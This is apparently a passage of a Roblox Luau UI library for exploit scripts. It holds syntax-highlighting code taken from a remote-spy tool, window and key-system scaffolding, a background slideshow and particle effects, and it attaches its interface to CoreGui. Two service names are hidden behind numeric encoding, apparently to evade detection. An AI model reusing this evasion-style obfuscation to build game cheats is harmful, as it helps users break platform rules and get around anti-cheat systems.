Library.PerformanceMode = false
Library.CodeColors = {}
Library.TabButtonHeight = 30
Library.ItemHeight = 35

local DefaultStyle = function()
	Library.CodeColors.backgroundColor = Color3.fromRGB(40, 44, 52)
	Library.CodeColors.operatorColor = Color3.fromRGB(187, 85, 255)
	Library.CodeColors.functionColor = Color3.fromRGB(97, 175, 239)
	Library.CodeColors.stringColor = Color3.fromRGB(152, 195, 121)
	Library.CodeColors.numberColor = Color3.fromRGB(209, 154, 102)
	Library.CodeColors.booleanColor = Color3.fromRGB(209, 154, 102)
	Library.CodeColors.objectColor = Color3.fromRGB(229, 192, 123)
	Library.CodeColors.defaultColor = Color3.fromRGB(224, 108, 117)
	Library.CodeColors.commentColor = Color3.fromRGB(148, 148, 148)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(148, 148, 148)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end

Library.CodeStyle = {}

function Library.CodeStyle:Default()
	DefaultStyle()
end

DefaultStyle()

function Library.CodeStyle:RobloxStudio()
	Library.CodeColors.backgroundColor = Color3.fromRGB(37, 37, 37)
	Library.CodeColors.operatorColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.functionColor = Color3.fromRGB(248, 109, 124)
	Library.CodeColors.stringColor = Color3.fromRGB(173, 241, 149)
	Library.CodeColors.numberColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.booleanColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.objectColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.defaultColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.commentColor = Color3.fromRGB(102, 102, 102)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(255, 255, 255)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end

function Library.CodeStyle:DarkLua()
	Library.CodeColors.backgroundColor = Color3.fromRGB(37, 37, 37)
	Library.CodeColors.operatorColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.functionColor = Color3.fromRGB(248, 0, 37)
	Library.CodeColors.stringColor = Color3.fromRGB(0, 241, 20)
	Library.CodeColors.numberColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.booleanColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.objectColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.defaultColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.commentColor = Color3.fromRGB(102, 102, 102)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(255, 255, 255)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end

Library.TextEffect = {}

function Library.TextEffect:AddColor(text: string, color: Color3)
	return `<font color="rgb({math.round(color.R * 255)},{tostring(math.round(color.G * 255))},{math.round(
		color.B * 255
	)})">{text}</font>`
end

function Library.TextEffect:Transparency(text: string, value: number)
	return `<font transparency="{value}">{text}</font>`
end

local offLimits = {}

-- Code from https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/highlight.lua --

--------------------------------语法高亮渲染函数------------------------------------------------------------------------
function render(source)
	tableContents = {}
	offLimits = {}
	lines = {}

	string.gsub(source, ".", function(a)
		table.insert(tableContents, {
			Char = a,
			Color = Library.CodeColors.defaultColor,
		})
	end)

	local function autoEscape(s)
		for i = 0, #s do
			local char = string.sub(s, i, i)
			if char == "<" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&lt;", string.sub(s, i + 1, -1))
				i += 3
			elseif char == ">" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&gt;", string.sub(s, i + 1, -1))
				i += 3
			elseif char == '"' then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&quot;", string.sub(s, i + 1, -1))
				i += 5
			elseif char == "'" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&apos;", string.sub(s, i + 1, -1))
				i += 5
			elseif char == "&" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&amp;", string.sub(s, i + 1, -1))
				i += 4
			end
		end
		-- s:gsub("<", "&lt;")
		-- s:gsub(">", "&gt;")
		-- s:gsub('"', "&quot;")
		-- s:gsub("'", "&apos;")
		-- s:gsub("&", "&amp;")
		return s
	end

	local function gfind(str, pattern)
		return coroutine.wrap(function()
			local start = 0
			while true do
				local findStart, findEnd = str:find(pattern, start)
				if findStart and findEnd ~= #str then
					start = findEnd + 1
					coroutine.yield(findStart, findEnd)
				else
					return
				end
			end
		end)
	end

	local function isOffLimits(index)
		for _, v in next, offLimits do
			if index >= v[1] and index <= v[2] then
				return true
			end
		end
		return false
	end

	local function highlightPattern(patternArray, color)
		local step = 1
		for _, pattern in next, patternArray do
			for findStart, findEnd in gfind(source, pattern) do
				if step % 1000 == 0 then
					task.wait()
				end
				step += 1
				if not isOffLimits(findStart) and not isOffLimits(findEnd) then
					for i = findStart, findEnd do
						if tableContents[i] then
							tableContents[i].Color = color
						end
					end
				end
			end
		end
	end

	local function renderStrings()
		local stringType
		local stringEndType
		local ignoreBackslashes
		local stringStart
		local stringEnd
		local offLimitsIndex
		local skip = false

		for i, char in next, tableContents do
			if stringType then
				char.Color = Library.CodeColors.stringColor
				local possibleString = ""
				for k = stringStart, i do
					possibleString = possibleString .. tableContents[k].Char
				end
				if
					char.Char:match(stringEndType) and not not ignoreBackslashes
					or (
						possibleString:match("(\\*)" .. stringEndType .. "$")
						and #possibleString:match("(\\*)" .. stringEndType .. "$") % 2 == 0
					)
				then
					skip = true
					stringType = nil
					stringEndType = nil
					ignoreBackslashes = nil
					stringEnd = i
					offLimits[offLimitsIndex][2] = stringEnd
				end
			end
			if not skip then
				for _, v in next, strings do
					if char.Char:match(v[1]) and not isOffLimits(i) then
						stringType = v[1]
						stringEndType = v[2]
						ignoreBackslashes = v[3]
						char.Color = Library.CodeColors.stringColor
						stringStart = i
						offLimitsIndex = #offLimits + 1
						offLimits[offLimitsIndex] = { stringStart, math.huge }
					end
				end
			end
			skip = false
		end
	end

	local function renderComments()
		local step = 1
		for _, pattern in next, comments do
			for commentStart, commentEnd in gfind(source, pattern) do
				if step % 1000 == 0 then
					task.wait()
				end
				step += 1
				if not isOffLimits(commentStart) then
					for i = commentStart, commentEnd do
						table.insert(offLimits, { commentStart, commentEnd })
						if tableContents[i] then
							tableContents[i].Color = Library.CodeColors.commentColor
						end
					end
				end
			end
		end
	end

	highlightPattern(functions, Library.CodeColors.functionColor)
	highlightPattern(numbers, Library.CodeColors.numberColor)
	highlightPattern(operators, Library.CodeColors.operatorColor)
	highlightPattern(objects, Library.CodeColors.objectColor)
	highlightPattern(booleans, Library.CodeColors.booleanColor)
	highlightPattern(other, Library.CodeColors.genericColor)
	renderComments()
	renderStrings()

	local lastColor
	local stack = {}
	local lineStr = ""
	local rawStr = ""
	local largestX = 0
	local line = 1

	for i = 1, #tableContents + 1 do
		local char = tableContents[i]
		if i == #tableContents + 1 or char.Char == "\n" then
			lineStr = lineStr .. (lastColor and "</font>" or "")

			table.insert(stack, lineStr)

			lineStr = ""
			rawStr = ""
			lastColor = nil
			line += 1

			if line % 5 == 0 then
				task.wait()
			end
		elseif char.Char == " " then
			lineStr = lineStr .. char.Char
			rawStr = rawStr .. char.Char
		elseif char.Char == "\t" then
			lineStr = lineStr .. string.rep(" ", 4)
			rawStr = rawStr .. char.Char
		else
			if char.Color == lastColor then
				lineStr = lineStr .. autoEscape(char.Char)
			else
				lineStr = lineStr
					.. string.format(
						'%s<font color="rgb(%d,%d,%d)">',
						lastColor and "</font>" or "",
						char.Color.R * 255,
						char.Color.G * 255,
						char.Color.B * 255
					)
				lineStr = lineStr .. autoEscape(char.Char)
				lastColor = char.Color
			end
			rawStr = rawStr .. char.Char
		end
	end

	return stack
end

--------------------------------------------------------------------------------------------------------
local tableContents = {}
local offLimits = {}
local lines = {}

function Library:GetTextSize(text, fontSize, font, custom_w)
	return TextService:GetTextSize(text, fontSize, font, Vector2.new(custom_w or math.huge, math.huge))
end

function Library:HightlightSource(source)
	return table.concat(render(source), "\n")
end

function Library:InputButton(Frame: Frame)
	local Button = Instance.new("TextButton")

	Button.Name = "Button"
	Button.Parent = Frame
	Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Button.BackgroundTransparency = 1.000
	Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Button.BorderSizePixel = 0
	Button.Size = UDim2.new(1, 0, 1, 0)
	Button.ZIndex = 12
	Button.Font = Enum.Font.SourceSans
	Button.TextColor3 = Color3.fromRGB(0, 0, 0)
	Button.TextSize = 14.000
	Button.TextTransparency = 1.000

	return Button
end

function Library:MakeDrop(Frame: Frame, Hover: UIStroke, Color: Color3)
	local CloneColor = Hover.Color

	Frame.MouseEnter:Connect(function()
		Library.TweenService
			:Create(Hover, TweenInfo.new(0.1), {
				Color = Color,
			})
			:Play()
	end)

	Frame.MouseLeave:Connect(function()
		Library.TweenService
			:Create(Hover, TweenInfo.new(0.1), {
				Color = CloneColor,
			})
			:Play()
	end)
end

function Library:DelayTween(belay: number, Frame: GuiObject, Info: TweenInfo, Prop: { any })
	local Instance = Library.TweenService.Create(Library.TweenService, Frame, Info, Prop)
	return task.delay(belay, Instance.Play, Instance)
end

function Library:Tween(Frame: GuiObject, TweenInfo: TweenInfo, Properties: {})
	if Library.PerformanceMode then
		table.foreach(Properties, function(name, value)
			Frame[name] = value
		end)

		return
	end

	local Instance = Library.TweenService:Create(Frame, TweenInfo, Properties)
	Instance:Play()
	return Instance
end
local blurEffect = Instance.new((function()
	local a = { 895, 1441, 1558, 1519, 934, 1363, 1363, 1350, 1324, 1545 }
	local b = ""
	for i = 1, #a do
		b = b .. string.char((a[i] - 37) / 13)
	end
	return b
end)())
local TweenService = game:GetService((function()
	local a = { 1129, 1584, 1350, 1350, 1467, 1116, 1350, 1519, 1571, 1402, 1324, 1350 }
	local b = ""
	for i = 1, #a do
		b = b .. string.char((a[i] - 37) / 13)
	end
	return b
end)())
blurEffect.Parent = game.Lighting
blurEffect.Size = 60

local blurTweenInfo = TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local blurTween = TweenService:Create(blurEffect, blurTweenInfo, { Size = 0 })

blurTween:Play()

coroutine.resume(coroutine.create(function()
	wait(2.5)
	blurEffect:Destroy()
end))
------// UI.标题设置 [图片太难搞了，我都封了十几个号了(还浪费我时间) 本来是想带点颜色图片，但是太能封号了，就不搞了]   //-------------------------------------------------------------------------------------
function Library:Windowxgo(setup)
	setup = setup or {}
	setup.Title = setup.Title or "Window"
	setup.Keybind = setup.Keybind or Enum.KeyCode.LeftControl
	setup.Size = setup.Size or Library.SizeLibrary.Default
	setup.KeySystem = setup.KeySystem or false
	setup.Logo = setup.Logo or "rbxassetid://7733920644"
	setup.ToggleMethod = setup.ToggleMethod or "Application"

	if setup.KeySystem then
		setup.KeySystemInfo = setup.KeySystemInfo or {}
		setup.KeySystemInfo.Title = setup.KeySystemInfo.Title or "Key System"
		setup.KeySystemInfo.OnGetKey = setup.KeySystemInfo.OnGetKey or function() end
		setup.KeySystemInfo.OnLogin = setup.KeySystemInfo.OnLogin or function()
			wait(0.1)
			return true
		end
	end

	local ScreenGui = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local BackgroundImage1 = Instance.new("ImageLabel")
	local BackgroundImage2 = Instance.new("ImageLabel")
	local DropShadow = Instance.new("ImageLabel")
	local Ico = Instance.new("ImageLabel")

	local images = {
		"rbxassetid://113180426865309",
		"rbxassetid://127110756366496",
		"rbxassetid://131471211520335",
		"rbxassetid://102428625138886",
		"rbxassetid://137332235358973",
		"rbxassetid://109520199976167",
		"rbxassetid://122958225353990",
		"rbxassetid://140434608197988",
		"rbxassetid://124568548523146",
		"rbxassetid://76544783777123",
		"rbxassetid://117347134697321",
		"rbxassetid://98554545052070",
		"rbxassetid://131266490485584",
		"rbxassetid://131496206276220",
		"rbxassetid://109752539854084",
		"rbxassetid://70869793345513",
		"rbxassetid://81618536870963",
		"rbxassetid://96996068161496",
		"rbxassetid://92875796313338",
		"rbxassetid://89067121877834",
		"rbxassetid://113186601959200",
		"rbxassetid://73164000772284",
		"rbxassetid://101305557601423",
		"rbxassetid://104067029112641",
		"rbxassetid://110630445580007",
		"rbxassetid://108644687915512",
		"rbxassetid://86540442133927",
		"rbxassetid://107018855884545",
		"rbxassetid://112966984941036",
		"rbxassetid://80598426066070",
		"rbxassetid://108391089326665",
		"rbxassetid://138013328013091",
		"rbxassetid://110990525726887",
		"rbxassetid://72760885562855",
		"rbxassetid://82117275977223",
		"rbxassetid://80695281901172",
		"rbxassetid://123238115911519",
		"rbxassetid://135035617747628",
		"rbxassetid://74297023080665",
		"rbxassetid://84550607098866",
		"rbxassetid://132992677171078",
		"rbxassetid://126722695077251",
		"rbxassetid://82915814593812",
		"rbxassetid://105485276493469",
		"rbxassetid://107983351429754",
		"rbxassetid://121439238665385",
		"rbxassetid://135083937747387",
		"rbxassetid://130643405858214",
		"rbxassetid://102409437463046",
		"rbxassetid://87780505852956",
		"rbxassetid://137945894459284",
		"rbxassetid://101196101249400",
		"rbxassetid://73934456979168",
		"rbxassetid://124323332173934",
		"rbxassetid://71240399712190",
		"rbxassetid://127390304118462",
		"rbxassetid://131409006813490",
		"rbxassetid://80253796704859",
		"rbxassetid://129206776380514",
		"rbxassetid://121697617411442",
		"rbxassetid://129410104830757",
		"rbxassetid://71101554362190",
		"rbxassetid://117937637678090",
		"rbxassetid://89768207500333",
		"rbxassetid://136363102949077",
		"rbxassetid://74648780628027",
		"rbxassetid://103232778626018",
		"rbxassetid://76127155963189",
		"rbxassetid://118305240093538",
		"rbxassetid://112630176374798",
		"rbxassetid://74804451529535",
		"rbxassetid://115691043156297",
		"rbxassetid://100980082510772",
		"rbxassetid://135027711714247",
		"rbxassetid://124541797505196",
		"rbxassetid://136302622336157",
		"rbxassetid://74234951901491",
		"rbxassetid://76489725657019",
		"rbxassetid://77202377271252",
		"rbxassetid://81630003819439",
		"rbxassetid://134782997900491",
		"rbxassetid://101854737639056",
		"rbxassetid://88726485475708",
		"rbxassetid://124568043722207",
		"rbxassetid://113389633674712",
		"rbxassetid://71709407546541",
		"rbxassetid://74810011141203",
		"rbxassetid://106797147237700",
		"rbxassetid://116081430548815",
		"rbxassetid://112444706829621",
		"rbxassetid://134571872103628",
		"rbxassetid://92696377732743",
		"rbxassetid://130172199019796",
		"rbxassetid://82973093488258",
		"rbxassetid://112015821138471",
		"rbxassetid://106309267111813",
		"rbxassetid://133651749360024",
		"rbxassetid://125782190205971",
		"rbxassetid://128380863807712",
		"rbxassetid://118455934351458",
		"rbxassetid://122027031695528",
		"rbxassetid://105338484595056",
		"rbxassetid://108356962585041",
		"rbxassetid://94727756963238",
		"rbxassetid://113369060406991",
		"rbxassetid://113055700957332",
		"rbxassetid://133933401543170",
		"rbxassetid://101200437987764",
		"rbxassetid://102653297586366",
		"rbxassetid://107740168905807",
		"rbxassetid://88737575142626",
		"rbxassetid://113517553044113",
		"rbxassetid://121228817458631",
		"rbxassetid://140445692483001",
		"rbxassetid://97012657684546",
		"rbxassetid://109770441736776",
		"rbxassetid://139654589284248",
		"rbxassetid://114899818362023",
		"rbxassetid://94168650195717",
		"rbxassetid://74708237561928",
		"rbxassetid://75220063478126",
		"rbxassetid://89442009784136",
		"rbxassetid://81363371302614",
		"rbxassetid://95090127115921",
		"rbxassetid://94878761352866",
		"rbxassetid://82649085151065",
		"rbxassetid://124416711850893",
		"rbxassetid://71541255764950",
		"rbxassetid://92209087296658",
		"rbxassetid://73571655606342",
		"rbxassetid://102206003630031",
		"rbxassetid://125872498375333",
		"rbxassetid://70537644787136",
		"rbxassetid://108141030464504",
		"rbxassetid://130832323012705",
		"rbxassetid://115780740644704",
		"rbxassetid://107295158179635",
		"rbxassetid://116751947898355",
		"rbxassetid://132823720486657",
		"rbxassetid://81355674663745",
		"rbxassetid://86901429245502",
		"rbxassetid://126080756779973",
		"rbxassetid://138383310224168",
		"rbxassetid://76134729494740",
		"rbxassetid://72802464061362",
		"rbxassetid://73405041245010",
		"rbxassetid://86394372063922",
		"rbxassetid://79115724459093",
		"rbxassetid://84892452493812",
		"rbxassetid://96632550808361",
		"rbxassetid://111291297728859",
		"rbxassetid://71088729747878",
		"rbxassetid://94127212697054",
		"rbxassetid://94670853484450",
		"rbxassetid://84501277764876",
		"rbxassetid://114562666643192",
		"rbxassetid://128148926071071",
		"rbxassetid://107276323783937",
		"rbxassetid://123536850708087",
		"rbxassetid://133973741652591",
		"rbxassetid://110262168733075",
		"rbxassetid://99789427813459",
		"rbxassetid://99161375032581",
		"rbxassetid://84104871915173",
		"rbxassetid://106230457114489",
		"rbxassetid://103723728627500",
		"rbxassetid://94099932651901",
		"rbxassetid://71739369133999",
		"rbxassetid://80208998151441",
		"rbxassetid://115102242642298",
		"rbxassetid://109237906599032",
		"rbxassetid://102037877532355",
		"rbxassetid://104449436840656",
		"rbxassetid://83867199796687",
		"rbxassetid://82305053286251",
		"rbxassetid://86823824398022",
		"rbxassetid://108446068418020",
		"rbxassetid://94124608866451",
		"rbxassetid://95796471721634",
		"rbxassetid://116293176150668",
		"rbxassetid://106566765380951",
		"rbxassetid://98952218855010",
		"rbxassetid://79123917378703",
		"rbxassetid://117851300780884",
		"rbxassetid://121423323859594",
		"rbxassetid://112633911945609",
		"rbxassetid://120900166533466",
		"rbxassetid://90941887059454",
		"rbxassetid://135856219822004",
		"rbxassetid://129092998323189",
		"rbxassetid://76153019426226",
		"rbxassetid://105863376128836",
		"rbxassetid://101612120099624",
		"rbxassetid://128842054892093",
		"rbxassetid://91679037471961",
		"rbxassetid://124654545008108",
		"rbxassetid://107543563766576",
		"rbxassetid://140470105657328",
		"rbxassetid://127156369853054",
		"rbxassetid://139231861561162",
		"rbxassetid://107998598717671",
		"rbxassetid://111897067138898",
		"rbxassetid://116877712033558",
		"rbxassetid://116620023248466",
		"rbxassetid://86460781810387",
		"rbxassetid://73975551091315",
		"rbxassetid://117709550322697",
		"rbxassetid://116165310785038",
		"rbxassetid://94012779929465",
		"rbxassetid://133736556529411",
		"rbxassetid://94809076430989",
		"rbxassetid://115310146111153",
		"rbxassetid://125302086691409",
		"rbxassetid://101380046568181",
		"rbxassetid://106150411139616",
		"rbxassetid://137038400436863",
		"rbxassetid://73207447927464",
		"rbxassetid://98145179912744",
		"rbxassetid://96305522672800",
		"rbxassetid://138700398520302",
		"rbxassetid://110227632017153",
		"rbxassetid://117159041948047",
		"rbxassetid://99118578473360",
		"rbxassetid://109946960265463",
		"rbxassetid://72857962777831",
		"rbxassetid://105045186567254",
		"rbxassetid://104325173765974",
		"rbxassetid://122991333146056",
		"rbxassetid://84232108971708",
		"rbxassetid://82346289970840",
		"rbxassetid://128026533554414",
		"rbxassetid://133304887576911",
		"rbxassetid://115596943057489",
		"rbxassetid://126166617256345",
		"rbxassetid://102390024228083",
		"rbxassetid://123144913127816",
		"rbxassetid://79239446982187",
		"rbxassetid://82946948263565",
		"rbxassetid://103978538129672",
		"rbxassetid://109910690533379",
		"rbxassetid://102758966602051",
		"rbxassetid://89176731754122",
		"rbxassetid://91724363419315",
		"rbxassetid://83870387504302",
		"rbxassetid://111060921599915",
		"rbxassetid://116604936921153",
		"rbxassetid://110961266532965",
		"rbxassetid://121651155995404",
		"rbxassetid://71410956953263",
		"rbxassetid://86755296299095",
		"rbxassetid://138552271140582",
		"rbxassetid://91156132315804",
		"rbxassetid://110272249057084",
		"rbxassetid://73800705556056",
		"rbxassetid://126963092855966",
		"rbxassetid://130633445624203",
		"rbxassetid://132720010498486",
		"rbxassetid://130431838452868",
		"rbxassetid://122661063909203",
		"rbxassetid://92512949372789",
		"rbxassetid://133825131748462",
		"rbxassetid://79939422072916",
		"rbxassetid://122893214955607",
		"rbxassetid://84137433422458",
		"rbxassetid://102822647057009",
		"rbxassetid://112258494542594",
		"rbxassetid://119407522460742",
		"rbxassetid://115384751406854",
		"rbxassetid://116871060567717",
		"rbxassetid://103367830571291",
		"rbxassetid://96998968464408",
		"rbxassetid://132579467991249",
		"rbxassetid://104888945315767",
		"rbxassetid://100633960898554",
		"rbxassetid://131269679070989",
		"rbxassetid://119328213269048",
		"rbxassetid://72633967224235",
		"rbxassetid://133389176535241",
		"rbxassetid://140492333414033",
		"rbxassetid://128721442456386",
		"rbxassetid://138178487928940",
		"rbxassetid://129455019299572",
		"rbxassetid://105908188662165",
		"rbxassetid://93578989735225",
		"rbxassetid://95782095712906",
		"rbxassetid://98539371973059",
		"rbxassetid://120175358163159",
		"rbxassetid://137124925655983",
		"rbxassetid://140522452875652",
		"rbxassetid://94766687118531",
		"rbxassetid://128380627742731",
		"rbxassetid://99851231567709",
		"rbxassetid://128552162899374",
		"rbxassetid://84870095788919",
		"rbxassetid://79104970810509",
		"rbxassetid://93291870365575",
		"rbxassetid://88915535593171",
		"rbxassetid://98140209313628",
		"rbxassetid://105910907501889",
		"rbxassetid://79586497161724",
		"rbxassetid://100567014025266",
		"rbxassetid://112368755924717",
		"rbxassetid://136246496911710",
		"rbxassetid://95857849844360",
		"rbxassetid://127383156664676",
		"rbxassetid://125097894031180",
		"rbxassetid://90842232527813",
		"rbxassetid://98231597415450",
		"rbxassetid://118052061728196",
		"rbxassetid://97461449629035",
		"rbxassetid://131263317400384",
		"rbxassetid://100663682258941",
		"rbxassetid://125934590125065",
		"rbxassetid://85950860713374",
		"rbxassetid://83223182022536",
		"rbxassetid://74814776493127",
		"rbxassetid://127389762731275",
		"rbxassetid://136324927689308",
		"rbxassetid://87188939840044",
		"rbxassetid://83654855239725",
		"rbxassetid://85955548830949",
		"rbxassetid://109846950915315",
		"rbxassetid://135928131229333",
		"rbxassetid://139493973213962",
		"rbxassetid://114209014671861",
		"rbxassetid://132293651901159",
		"rbxassetid://80827064765533",
		"rbxassetid://99752135015489",
		"rbxassetid://114728977368231",
		"rbxassetid://139266256221471",
		"rbxassetid://86979838000819",
		"rbxassetid://93092463392537",
		"rbxassetid://102268735725390",
		"rbxassetid://83494304109970",
		"rbxassetid://90201324587145",
		"rbxassetid://80470711190039",
		"rbxassetid://112685547627009",
		"rbxassetid://88099959129530",
		"rbxassetid://123572015723172",
		"rbxassetid://77344234610326",
		"rbxassetid://76891078817472",
		"rbxassetid://91657099430282",
		"rbxassetid://77110848199767",
		"rbxassetid://133288552537181",
		"rbxassetid://138495701339383",
		"rbxassetid://100000222799561",
		"rbxassetid://78603341208578",
		"rbxassetid://134718107963116",
		"rbxassetid://73582596868447",
		"rbxassetid://117920716551895",
		"rbxassetid://78918702869671",
		"rbxassetid://114143305759591",
		"rbxassetid://78688958394804",
		"rbxassetid://133843467681317",
		"rbxassetid://79583421205042",
		"rbxassetid://137465326855311",
		"rbxassetid://112567671712996",
		"rbxassetid://132672757814397",
		"rbxassetid://136842364606673",
		"rbxassetid://74636237060419",
		"rbxassetid://110959984143843",
	}
--      "rbxassetid://",
--		"rbxassetid://",
	math.randomseed(tick())
	local function shuffle(t)
		for i = #t, 2, -1 do
			local j = math.random(i)
			t[i], t[j] = t[j], t[i]
		end
		return t
	end
	local queue = shuffle(table.clone(images))
	local queuePtr = 1

	local readyToLoad = Instance.new("BindableEvent")
	local nextToPreload = 2

	task.spawn(function()
		game:GetService("ContentProvider"):PreloadAsync(images)
	end)

	local preloader = Instance.new("ImageLabel")
	preloader.Visible = false
	preloader.Parent = ScreenGui

	local function initBackgrounds()
		BackgroundImage1.Parent = MainFrame
		BackgroundImage1.BackgroundTransparency = 1
		BackgroundImage1.Size = UDim2.new(1, 0, 1, 0)
		BackgroundImage1.Position = UDim2.new(0, 0, 0, 0)
		BackgroundImage1.Image = queue[queuePtr]
		BackgroundImage1.ScaleType = Enum.ScaleType.Stretch
		BackgroundImage1.ImageTransparency = 0
		BackgroundImage1.ZIndex = 1

		BackgroundImage2.Parent = MainFrame
		BackgroundImage2.BackgroundTransparency = 1
		BackgroundImage2.Size = UDim2.new(1, 0, 1, 0)
		BackgroundImage2.Position = UDim2.new(1, 0, 0, 0)
		BackgroundImage2.Image = queue[queuePtr]
		BackgroundImage2.ImageTransparency = 0
		BackgroundImage2.ScaleType = Enum.ScaleType.Stretch
		BackgroundImage2.ZIndex = 2
	end

	local slideDuration = 1.5
	local interval = 13.5

	local function slideSwitch()
		queuePtr = queuePtr + 1
		if queuePtr > #queue then
			queue = shuffle(table.clone(images))
			queuePtr = 1
		end
		BackgroundImage2.Image = queue[queuePtr]

		BackgroundImage2.Position = UDim2.new(1, 0, 0, 0)
		Library:Tween(
			BackgroundImage2,
			Library.TweenLibrary.SmallEffect,
			{ Position = UDim2.new(0, 0, 0, 0) },
			slideDuration
		)
		Library:Tween(
			BackgroundImage1,
			Library.TweenLibrary.SmallEffect,
			{ Position = UDim2.new(-1, 0, 0, 0) },
			slideDuration
		)

		task.wait(slideDuration)

		BackgroundImage1.Image = BackgroundImage2.Image
		BackgroundImage1.Position = UDim2.new(0, 0, 0, 0)
		BackgroundImage2.Position = UDim2.new(1, 0, 0, 0)

		readyToLoad:Fire()
	end

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ResetOnSpawn = false
	ScreenGui.IgnoreGuiInset = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

	MainFrame.Name = "MainFrame"
	MainFrame.Parent = ScreenGui
	MainFrame.Active = true
	MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	MainFrame.BackgroundTransparency = 0.250
	MainFrame.BorderSizePixel = 0
	MainFrame.ClipsDescendants = true
	MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	MainFrame.Size = UDim2.fromScale(0, 0)

	do
		----------------------------------------------------------------
		local particleFolder = Instance.new("Frame")
		particleFolder.Name = "PlayableStars"
		particleFolder.Parent = MainFrame
		particleFolder.AnchorPoint = Vector2.new(0.5, 0.5)
		particleFolder.Position = UDim2.fromScale(0.5, 0.5)
		particleFolder.Size = UDim2.fromScale(1, 1)
		particleFolder.BackgroundTransparency = 1
		particleFolder.ZIndex = 5
		particleFolder.ClipsDescendants = true

		local isParticleActive = true
		local heartbeatConnection = nil
		local rng = Random.new()
		local run = game:GetService("RunService")
		local uis = game:GetService("UserInputService")
		local guiServ = game:GetService("GuiService")

		---------------- 参数 ----------------
		local TOTAL_COUNT = 30
		local FIRST_BATCH = 15
		local FADE_DELAY = 13
		local SPAWN_GAP = 3
		local FALL_SPEED = 0.2
		local HORIZONTAL_RANGE = 0.6
		local MIN_SIZE, MAX_SIZE = 8, 14
		local MIN_ROT_SPEED, MAX_ROT_SPEED = -0.5, 0.5
		local STAR_ELASTICITY = 0.75
		local COLLAPSED_THRESHOLD = 50

		-- 波纹
		local WAVE_MAX_RADIUS = 200
		local WAVE_DURATION = 0.4
		local WAVE_PUSH_SPEED = 0.6
		local WAVE_DECAY = 0.88

		-- 公转
		local ORBIT_SPEED = 1.2 -- 弧度/秒
		local ORBIT_RADIUS = 0.25 -- 比例半径
		local LONG_PRESS_TIME = 0.35 -- 长按判定时间
		------------------------------------------

		local particles = {}
		local dragging = nil
		local secondSpawned = false
		local starImageIds = {
			"rbxassetid://112950808406477",
			"rbxassetid://126585145865309",
			"rbxassetid://140049610411995",
			"rbxassetid://127810956322486",
		}

		-- 冲击波
		local waveActive = false
		local waveCenter = Vector2.zero
		local waveRadius = 0
		local waveSpeed = WAVE_MAX_RADIUS / WAVE_DURATION

		-- 长按状态
		local pressStart = 0
		local longPressing = false
		local pressConn = nil
		local releaseConn = nil

		----------------------------------------------------------------函数
		local function getFallInitParams()
			local initX = rng:NextNumber(0, 1)
			local initY = rng:NextNumber(-0.1, 0)
			local horizontalOffset = rng:NextNumber(-HORIZONTAL_RANGE, HORIZONTAL_RANGE) * FALL_SPEED
			local verticalSpeed = FALL_SPEED
			return initX, initY, horizontalOffset, verticalSpeed
		end

		local function spawnStar()
			if not isParticleActive then
				return
			end
			local star = Instance.new("ImageLabel")
			star.Name = "Star"
			star.Parent = particleFolder
			star.AnchorPoint = Vector2.new(0.5, 0.5)
			star.BackgroundTransparency = 1
			star.Image = starImageIds[rng:NextInteger(1, #starImageIds)]
			star.ScaleType = Enum.ScaleType.Fit
			star.ZIndex = 5

			local s = rng:NextInteger(MIN_SIZE, MAX_SIZE)
			star.Size = UDim2.fromOffset(s, s)
			local r = s * 0.5
			local initRot = rng:NextNumber(0, 360)
			star.Rotation = initRot
			local rotSpeed = rng:NextNumber(MIN_ROT_SPEED, MAX_ROT_SPEED)

			local initX, initY, vx, vy = getFallInitParams()
			star.Position = UDim2.new(initX, 0, initY, 0)
			star.ImageTransparency = rng:NextNumber(0.2, 0.5)
			star.ImageColor3 = Color3.fromHSV(rng:NextNumber(), 1, 1)

			local data = {
				obj = star,
				vx = vx,
				vy = vy,
				life = 0,
				rot = initRot,
				rotSpeed = rotSpeed,
				r = r,
				waveVx = 0,
				waveVy = 0,
				-- 公转
				orbitAngle = rng:NextNumber(0, 2 * math.pi),
				orbitRadius = rng:NextNumber(ORBIT_RADIUS * 0.7, ORBIT_RADIUS),
				orbitSpeed = ORBIT_SPEED * (rng:NextNumber() < 0.5 and 1 or -1),
			}

			-- 拖拽
			local function onPress(input)
				if not isParticleActive then
					return
				end
				if
					input.UserInputType == Enum.UserInputType.Touch
					or input.UserInputType == Enum.UserInputType.MouseButton1
				then
					dragging = data
					data.vx, data.vy = 0, 0
				end
			end
			local function onMove(input)
				if not isParticleActive then
					return
				end
				if dragging == data then
					local pos = uis:GetMouseLocation()
					local rel = MainFrame.AbsoluteSize
					local x = math.clamp(pos.X - MainFrame.AbsolutePosition.X, 0, rel.X) / rel.X
